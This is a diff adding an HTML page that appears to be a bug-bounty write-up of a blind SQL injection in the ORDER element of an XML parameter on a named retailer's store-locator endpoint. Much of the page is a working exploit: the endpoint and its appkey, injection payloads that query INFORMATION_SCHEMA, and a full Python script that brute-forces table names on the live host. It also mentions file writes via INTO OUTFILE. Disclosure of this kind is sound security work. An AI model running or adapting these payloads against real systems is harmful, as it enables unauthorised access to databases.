@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Sqli in Xml on Order by in Bug Bounty · Brototo
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="The Brototo Team">
+<meta name="description" content="
+  SQLi via ORDER BY on GET parameters xml_request via https://locations.vans.com/ajax
+  
+    
+    Link to heading
+  
+
+
+  The bug description
+  
+    
+    Link to heading
+  
+
+On the https://locations.vans.com website, there is an endpoint for Ajax calls.
+This call contains a GET xml_request argument, containing XML encoded using url_encode.
+A decoded example of expected XML:
+&lt;request&gt;
+    &lt;appkey&gt;CFCAC866-ADF8-11E3-AC4F-1340B945EC6E&lt;/appkey&gt;
+    &lt;formdata id=&#34;getlist&#34;&gt;
+        &lt;objectname&gt;Country&lt;/objectname&gt;
+    &lt;/formdata&gt;
+&lt;/request&gt;
+XML can contain other pieces than objectname, for the SQLi bug we will focus on order:">
+<meta name="keywords" content="brototo,hacking,security">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Sqli in Xml on Order by in Bug Bounty">
+  <meta name="twitter:description" content="SQLi via ORDER BY on GET parameters xml_request via https://locations.vans.com/ajax Link to heading The bug description Link to heading On the https://locations.vans.com website, there is an endpoint for Ajax calls.
+This call contains a GET xml_request argument, containing XML encoded using url_encode.
+A decoded example of expected XML:
+&lt;request&gt; &lt;appkey&gt;CFCAC866-ADF8-11E3-AC4F-1340B945EC6E&lt;/appkey&gt; &lt;formdata id=&#34;getlist&#34;&gt; &lt;objectname&gt;Country&lt;/objectname&gt; &lt;/formdata&gt; &lt;/request&gt; XML can contain other pieces than objectname, for the SQLi bug we will focus on order:">
+
+<meta property="og:url" content="http://localhost:1313/writeups/sqli-in-xml-on-order-by-in-bug-bounty.en-copy/">
+  <meta property="og:site_name" content="Brototo">
+  <meta property="og:title" content="Sqli in Xml on Order by in Bug Bounty">
+  <meta property="og:description" content="SQLi via ORDER BY on GET parameters xml_request via https://locations.vans.com/ajax Link to heading The bug description Link to heading On the https://locations.vans.com website, there is an endpoint for Ajax calls.
+This call contains a GET xml_request argument, containing XML encoded using url_encode.
+A decoded example of expected XML:
+&lt;request&gt; &lt;appkey&gt;CFCAC866-ADF8-11E3-AC4F-1340B945EC6E&lt;/appkey&gt; &lt;formdata id=&#34;getlist&#34;&gt; &lt;objectname&gt;Country&lt;/objectname&gt; &lt;/formdata&gt; &lt;/request&gt; XML can contain other pieces than objectname, for the SQLi bug we will focus on order:">
+  <meta property="og:locale" content="fr_FR">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-03-23T11:37:36+01:00">
+    <meta property="article:modified_time" content="2025-03-23T11:37:36+01:00">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/writeups/sqli-in-xml-on-order-by-in-bug-bounty.en-copy/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/icon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/icon.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/icon-16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+<body class="preload-transitions colorscheme-light">
+  
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      Brototo
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/writeups/">Writeups</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>>></span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="/en/">translate en _</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/writeups/sqli-in-xml-on-order-by-in-bug-bounty.en-copy/">
+          Sqli in Xml on Order by in Bug Bounty
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="sqli-via-order-by-on-get-parameters-xml_request-via">
+  SQLi via ORDER BY on GET parameters xml_request via <a href="https://locations.vans.com/ajax"  class="external-link" target="_blank" rel="noopener">https://locations.vans.com/ajax</a>
+  <a class="heading-link" href="#sqli-via-order-by-on-get-parameters-xml_request-via">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="the-bug-description">
+  The bug description
+  <a class="heading-link" href="#the-bug-description">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>On the <a href="https://locations.vans.com"  class="external-link" target="_blank" rel="noopener">https://locations.vans.com</a> website, there is an endpoint for Ajax calls.</p>
+<p>This call contains a GET <strong>xml_request</strong> argument, containing XML encoded using <strong>url_encode</strong>.</p>
+<p>A <strong>decoded</strong> example of expected XML:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#7ee787">&lt;request&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&lt;appkey&gt;</span>CFCAC866-ADF8-11E3-AC4F-1340B945EC6E<span style="color:#7ee787">&lt;/appkey&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&lt;formdata</span> id=<span style="color:#a5d6ff">&#34;getlist&#34;</span><span style="color:#7ee787">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&lt;objectname&gt;</span>Country<span style="color:#7ee787">&lt;/objectname&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&lt;/formdata&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#7ee787">&lt;/request&gt;</span>
+</span></span></code></pre></div><p>XML can contain other pieces than <strong>objectname</strong>, for the SQLi bug we will focus on <strong>order</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#7ee787">&lt;request&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&lt;appkey&gt;</span>CFCAC866-ADF8-11E3-AC4F-1340B945EC6E<span style="color:#7ee787">&lt;/appkey&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&lt;formdata</span> id=<span style="color:#a5d6ff">&#34;getlist&#34;</span><span style="color:#7ee787">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&lt;order&gt;</span>18<span style="color:#7ee787">&lt;/order&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&lt;objectname&gt;</span>Country<span style="color:#7ee787">&lt;/objectname&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&lt;/formdata&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#7ee787">&lt;/request&gt;</span>
+</span></span></code></pre></div><h2 id="steps-to-reproduce">
+  Steps To Reproduce:
+  <a class="heading-link" href="#steps-to-reproduce">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>In order to validate the SQL Injection, we made this first payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#7ee787">&lt;request&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&lt;appkey&gt;</span>CFCAC866-ADF8-11E3-AC4F-1340B945EC6E<span style="color:#7ee787">&lt;/appkey&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&lt;formdata</span> id=<span style="color:#a5d6ff">&#34;getlist&#34;</span><span style="color:#7ee787">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&lt;order&gt;</span>18--BAD<span style="color:#7ee787">&lt;/order&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7ee787">&lt;objectname&gt;</span>Country<span style="color:#7ee787">&lt;/objectname&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&lt;/formdata&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#7ee787">&lt;/request&gt;</span>
+</span></span></code></pre></div><p>Which will give this url: <a href="https://locations.vans.com/ajax?lang=fr_FR&amp;isSOCiLocator=true&amp;xml_request=%3Crequest%3E%0A%20%20%20%20%3Cappkey%3ECFCAC866-ADF8-11E3-AC4F-1340B945EC6E%3C%2Fappkey%3E%0A%20%20%20%20%3Cformdata%20id%3D%22getlist%22%3E%0A%20%20%20%20%20%20%20%20%3Corder%3E18--BAD%3C%2Forder%3E%0A%20%20%20%20%20%20%20%20%3Cobjectname%3ECountry%3C%2Fobjectname%3E%0A%20%20%20%20%3C%2Fformdata%3E%0A%3C%2Frequest%3E"  class="external-link" target="_blank" rel="noopener">payload url</a></p>
+<p>While an error would have been triggered if the flaw weren&rsquo;t present, no error occurs because &ndash; acts as a comment, and thus the BAD content is not interpreted.</p>
+<p>To exploit this bug, we now need to be cunning in order to extract information.</p>
+<p>To do this, the SQL query probably has this form:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff7b72">SELECT</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">FROM</span><span style="color:#6e7681"> </span>w2gi.country<span style="color:#6e7681"> </span><span style="color:#ff7b72">ORDER</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">BY</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">1</span><span style="color:#8b949e;font-style:italic">--BAD
+</span></span></span></code></pre></div><p>To determine the results, we will proceed as follows:</p>
+<ul>
+<li>If a condition is <strong>OK</strong>, we will return a result.</li>
+<li>If a condition is *<em>NOT OK</em>, we will return 0 results.</li>
+</ul>
+<p>The condition we&rsquo;re interested in for our PoC is <strong>discovering table&rsquo;s name</strong>.</p>
+<p>Here&rsquo;s the basic SQL query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff7b72">SELECT</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">FROM</span><span style="color:#6e7681"> </span>country<span style="color:#6e7681"> </span><span style="color:#ff7b72">ORDER</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">BY</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">1</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">LIMIT</span><span style="color:#6e7681"> </span>(<span style="color:#ff7b72">CASE</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">WHEN</span><span style="color:#6e7681"> </span>(<span style="color:#ff7b72">SELECT</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">COUNT</span>(<span style="color:#ff7b72">table_name</span>)<span style="color:#6e7681"> </span><span style="color:#ff7b72">FROM</span><span style="color:#6e7681"> </span>INFORMATION_SCHEMA.TABLES<span style="color:#6e7681"> </span><span style="color:#ff7b72">WHERE</span><span style="color:#6e7681"> </span>table_schema<span style="color:#6e7681"> </span><span style="color:#ff7b72">LIKE</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">&#39;w2gi&#39;</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">AND</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">table_name</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">LIKE</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">&#39;coun%&#39;</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">LIMIT</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">1</span>)<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">&gt;</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">0</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">THEN</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">1</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">ELSE</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">0</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">END</span>)<span style="color:#6e7681">
+</span></span></span></code></pre></div><p>Simply add a character after <strong>coun</strong> to determine whether or not it exists.</p>
+<ul>
+<li><strong>couna</strong> will return an empty result (<strong>LIMIT 0</strong>)</li>
+<li><strong>count</strong> will return a result (<strong>LIMIT 1</strong>)
+<em>We take this example because we already know <strong>country</strong> exist.</em></li>
+</ul>
+<p>We still need to develop a script to automate everything.</p>
+<h2 id="the-full-poc-with-code">
+  The full PoC with code
+  <a class="heading-link" href="#the-full-poc-with-code">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>To validate the bug and its critical scope, we opted for a <strong>simple read of the database</strong> tables to minimize any risk of real impact. We should extract all data in all the databases, but we only PoC with table name.</p>
+<p>However, a malicious attacker could <strong>write directly</strong> to the database, via nested queries, and even <strong>write into external files</strong> via &ldquo;<strong>INTO OUTFILE</strong>&rdquo; functions, potentially compromising the entire server.</p>
+<p>Here is a <strong>Python Script</strong>, we made it to discover a table name (<em>you can specify the beginning of the table name</em>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">urllib3</span>
+</span></span><span style="display:flex;"><span>urllib3<span style="color:#ff7b72;font-weight:bold">.</span>disable_warnings()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cookies <span style="color:#ff7b72;font-weight:bold">=</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#ff7b72;font-weight:bold">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;Host&#39;</span>: <span style="color:#a5d6ff">&#39;locations.vans.com&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;User-Agent&#39;</span>: <span style="color:#a5d6ff">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;Accept&#39;</span>: <span style="color:#a5d6ff">&#39;text/javascript, text/html, application/xml, text/xml, */*&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;Accept-Language&#39;</span>: <span style="color:#a5d6ff">&#39;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;Accept-Encoding&#39;</span>: <span style="color:#a5d6ff">&#39;gzip, deflate, br, zstd&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;X-Requested-With&#39;</span>: <span style="color:#a5d6ff">&#39;XMLHttpRequest&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;X-Prototype-Version&#39;</span>: <span style="color:#a5d6ff">&#39;1.7.2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;Connection&#39;</span>: <span style="color:#a5d6ff">&#39;keep-alive&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;Referer&#39;</span>: <span style="color:#a5d6ff">&#39;https://locations.vans.com/&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;Sec-Fetch-Dest&#39;</span>: <span style="color:#a5d6ff">&#39;empty&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;Sec-Fetch-Mode&#39;</span>: <span style="color:#a5d6ff">&#39;cors&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;Sec-Fetch-Site&#39;</span>: <span style="color:#a5d6ff">&#39;same-origin&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#39;Priority&#39;</span>: <span style="color:#a5d6ff">&#39;u=0&#39;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sql_injection_template <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;1 LIMIT (CASE WHEN (SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema LIKE %27w2gi%27 AND table_name LIKE %27{{TABLE_NAME}}</span><span style="color:#a5d6ff">%25%</span><span style="color:#a5d6ff">27 LIMIT 1) </span><span style="color:#a5d6ff">%3E</span><span style="color:#a5d6ff"> 0 THEN 1 ELSE 0 END)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chars <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;</span>
+</span></span><span style="display:flex;"><span>round_iterator <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>current_table_name_found <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;v&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">while</span> <span style="color:#79c0ff">True</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> round_iterator <span style="color:#ff7b72;font-weight:bold">==</span> len(chars):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#a5d6ff">&#34;==&gt; &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> current_table_name_found)
+</span></span><span style="display:flex;"><span>        exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sql_injection <span style="color:#ff7b72;font-weight:bold">=</span> sql_injection_template<span style="color:#ff7b72;font-weight:bold">.</span>replace(<span style="color:#a5d6ff">&#34;{{TABLE_NAME}}&#34;</span>, current_table_name_found <span style="color:#ff7b72;font-weight:bold">+</span> chars[round_iterator])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sql_injection <span style="color:#ff7b72;font-weight:bold">=</span> sql_injection<span style="color:#ff7b72;font-weight:bold">.</span>replace(<span style="color:#a5d6ff">&#34; &#34;</span>, <span style="color:#a5d6ff">&#34;%20&#34;</span>)
+</span></span><span style="display:flex;"><span>    response <span style="color:#ff7b72;font-weight:bold">=</span> requests<span style="color:#ff7b72;font-weight:bold">.</span>get(
+</span></span><span style="display:flex;"><span>        <span style="color:#a5d6ff">&#39;https://locations.vans.com:443/ajax?lang=fr_FR&amp;isSOCiLocator=true&amp;xml_request=%3Crequest</span><span style="color:#a5d6ff">%3E</span><span style="color:#a5d6ff">%0A</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20%3Cappkey</span><span style="color:#a5d6ff">%3E</span><span style="color:#a5d6ff">CFCAC866-ADF8-11E3-AC4F-1340B945EC6E%3C/appkey</span><span style="color:#a5d6ff">%3E</span><span style="color:#a5d6ff">%0A</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20%3Cformdata</span><span style="color:#a5d6ff">%20i</span><span style="color:#a5d6ff">d=</span><span style="color:#a5d6ff">%22g</span><span style="color:#a5d6ff">etlist</span><span style="color:#a5d6ff">%22%</span><span style="color:#a5d6ff">3E%0A</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20%3Corder</span><span style="color:#a5d6ff">%3E</span><span style="color:#a5d6ff">&#39;</span> <span style="color:#ff7b72;font-weight:bold">+</span> sql_injection <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#39;%3C/order</span><span style="color:#a5d6ff">%3E</span><span style="color:#a5d6ff">%0A</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20%3Cobjectname</span><span style="color:#a5d6ff">%3E</span><span style="color:#a5d6ff">Country%3C/objectname</span><span style="color:#a5d6ff">%3E</span><span style="color:#a5d6ff">%0A</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20</span><span style="color:#a5d6ff">%20%</span><span style="color:#a5d6ff">20%3C/formdata</span><span style="color:#a5d6ff">%3E</span><span style="color:#a5d6ff">%0A%3C/request</span><span style="color:#a5d6ff">%3E</span><span style="color:#a5d6ff">&#39;</span>,
+</span></span><span style="display:flex;"><span>        cookies<span style="color:#ff7b72;font-weight:bold">=</span>cookies,
+</span></span><span style="display:flex;"><span>        headers<span style="color:#ff7b72;font-weight:bold">=</span>headers,
+</span></span><span style="display:flex;"><span>        verify<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">False</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> len(response<span style="color:#ff7b72;font-weight:bold">.</span>text) <span style="color:#ff7b72;font-weight:bold">&gt;</span> len(<span style="color:#a5d6ff">&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;response code=&#34;1006&#34;&gt;&lt;message&gt;&lt;text&gt;No records available&lt;/text&gt;&lt;/message&gt;&lt;/response&gt;&#39;</span>):
+</span></span><span style="display:flex;"><span>        current_table_name_found <span style="color:#ff7b72;font-weight:bold">+=</span> chars[round_iterator]
+</span></span><span style="display:flex;"><span>        print(<span style="color:#a5d6ff">&#34;NEW CHAR =&gt; &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> chars[round_iterator] <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34; (&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> current_table_name_found <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34;)&#34;</span>)
+</span></span><span style="display:flex;"><span>        round_iterator <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">else</span>:
+</span></span><span style="display:flex;"><span>        round_iterator <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#a5d6ff">1</span>
+</span></span></code></pre></div><p>Here are <strong>3</strong> results to valid the process (only the names of the tables) :</p>
+<p>{IMAGE_1}</p>
+<p>{IMAGE_2}</p>
+<p>{IMAGE_3}</p>
+<h2 id="how-to-fix">
+  How to fix
+  <a class="heading-link" href="#how-to-fix">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>You need to control the input of <strong>ORDER</strong> part in the XML.</p>
+<p>A best usage is to only control the sql query in backend.</p>
+<h2 id="thanks">
+  Thanks
+  <a class="heading-link" href="#thanks">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Thanks a lot for your program, we really enjoy working on it.
+We remain at your disposal if you have any questions..</p>
+<p><strong>Best Regards,</strong>
+<em>The Brototo team.</em></p>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     The Brototo Team 
+    ·
+    
+    Propulsé par <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
